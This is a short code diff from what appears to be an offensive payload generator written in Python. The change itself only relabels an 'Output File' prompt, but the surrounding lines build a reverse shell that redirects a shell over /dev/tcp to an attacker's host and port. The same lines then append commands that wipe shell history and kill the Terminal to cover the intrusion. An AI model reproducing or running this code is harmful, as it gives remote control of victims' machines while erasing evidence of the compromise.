@@ -40,7 +40,7 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		shell_command += "history -wc;killall Terminal"
-		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		path = raw_input(h.info_general_raw("Output Path: ")).strip(" ")
 		while path == "":
 		    path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
 		if os.path.isdir(path):
